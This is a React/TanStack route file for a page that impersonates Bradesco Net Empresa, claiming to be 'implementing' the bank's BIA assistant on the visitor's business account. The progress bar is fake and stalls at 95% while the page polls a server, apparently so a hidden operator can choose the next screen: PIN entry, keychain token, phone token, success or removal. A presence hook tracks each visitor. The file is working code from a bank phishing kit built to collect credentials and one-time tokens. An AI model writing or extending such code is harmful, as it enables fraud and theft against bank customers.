import { useEffect, useRef, useState } from "react";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { verificarStatus } from "@/lib/cliente.functions";
import { usePresenca } from "@/hooks/use-presenca";
import biaImg from "@/assets/bia.png.asset.json";
import fundoBia from "@/assets/fundo-bia.png.asset.json";

const searchSchema = z.object({ id: z.string().uuid() });

export const Route = createFileRoute("/interna")({
  validateSearch: (s: Record<string, unknown>) => searchSchema.parse(s),
  head: () => ({
    meta: [
      { title: "Implementação da BIA — Bradesco Net Empresa" },
      { name: "description", content: "Implementação da Inteligência Artificial BIA em sua conta empresarial." },
      { property: "og:title", content: "Implementação da BIA" },
      { property: "og:description", content: "Implementação da Inteligência Artificial BIA em sua conta empresarial." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: InternaPage,
});

const ETAPAS = [
  "Preparando ambiente da BIA",
  "Sincronizando perfil da conta",
  "Ativando modelos de inteligência",
  "Aplicando personalização empresarial",
  "Concluindo implementação",
];

function InternaPage() {
  const { id } = Route.useSearch();
  const checar = useServerFn(verificarStatus);
  const navigate = useNavigate();
  const [progresso, setProgresso] = useState(0);
  const [etapa, setEtapa] = useState(0);
  const finalizadoRef = useRef(false);

  usePresenca(id, "concluido");

  useEffect(() => {
    const t = setInterval(() => {
      setProgresso((p) => {
        if (finalizadoRef.current) return 100;
        if (p >= 95) return 95;
        const inc = p < 60 ? 1.0 : p < 85 ? 0.5 : 0.2;
        const next = Math.min(95, p + inc);
        setEtapa(Math.min(ETAPAS.length - 1, Math.floor((next / 100) * ETAPAS.length)));
        return next;
      });
    }, 260);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    const t = setInterval(async () => {
      try {
        const res = await checar({ data: { id } });
        if (res.status === "removido") {
          finalizadoRef.current = true;
          navigate({ to: "/" });
          return;
        }
        if (res.status === "reprovado") {
          finalizadoRef.current = true;
          return;
        }
        if (res.proxima_tela && res.proxima_tela !== "interna") {
          finalizadoRef.current = true;
          setProgresso(100);
          setEtapa(ETAPAS.length - 1);
          setTimeout(() => {
            if (res.proxima_tela === "sucesso") {
              navigate({ to: "/sucesso" });
              return;
            }
            const destino =
              res.proxima_tela === "pin"
                ? "/pin"
                : res.proxima_tela === "token_chaveiro"
                  ? "/token-chaveiro"
                  : "/token-celular";
            navigate({ to: destino, search: { id } });
          }, 400);
        }
      } catch {
        // silencia
      }
    }, 2500);
    return () => clearInterval(t);
  }, [id, checar, navigate]);

  return (
    <div className="relative min-h-screen w-full overflow-hidden font-sans text-[13px] text-[#333]">
      {/* Fundo ofuscado cobrindo toda a tela sem sair das bordas */}
      <div
        aria-hidden
        className="absolute inset-0 bg-no-repeat"
        style={{
          backgroundImage: `url(${fundoBia.url})`,
          backgroundPosition: "top left",
          backgroundSize: "cover",
          filter: "blur(8px) brightness(0.7)",
        }}
      />
      <div aria-hidden className="absolute inset-0 bg-black/40" />

      {/* Box de implementação */}
      <main className="relative z-10 flex min-h-screen items-center justify-center px-4 py-10">
        <div className="w-full max-w-[560px] overflow-hidden border border-[#e2e2e2] bg-white shadow-[0_20px_60px_rgba(0,0,0,0.35)]">
          <div className="relative flex h-[220px] items-center justify-center overflow-hidden bg-[#1a0530]">
            <img
              src={biaImg.url}
              alt="BIA — Inteligência Artificial do Bradesco"
              className="absolute inset-0 h-full w-full object-cover opacity-90"
            />
            <div className="absolute inset-0 bg-gradient-to-b from-transparent via-transparent to-black/40" />
          </div>

          <div className="px-10 py-10">
            <div className="mx-auto max-w-[460px] text-center">
              <p className="text-[11px] font-medium uppercase tracking-[0.18em] text-[#999]">
                Bradesco Net Empresa
              </p>
              <h1 className="mt-2 text-[22px] font-light tracking-tight text-[#222]">
                Implementando a <span className="font-semibold text-[#c8102e]">BIA</span> em sua conta
              </h1>
              <p className="mt-3 text-[13px] leading-relaxed text-[#666]">
                A Inteligência Artificial do Bradesco está sendo ativada para o seu perfil empresarial.
                O processo é automático e leva apenas alguns instantes.
              </p>

              <div className="mt-8">
                <div className="h-[3px] w-full overflow-hidden rounded-full bg-[#f0f0f0]">
                  <div
                    className="h-full bg-[#c8102e] transition-all duration-300 ease-out"
                    style={{ width: `${progresso}%` }}
                  />
                </div>
                <div className="mt-2.5 flex justify-between text-[11px] text-[#999]">
                  <span className="text-[#555]">{ETAPAS[etapa]}</span>
                  <span className="font-mono tabular-nums">{Math.floor(progresso)}%</span>
                </div>
              </div>

              <p className="mt-10 text-[11px] text-[#aaa]">
                Mantenha esta página aberta até a conclusão.
              </p>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
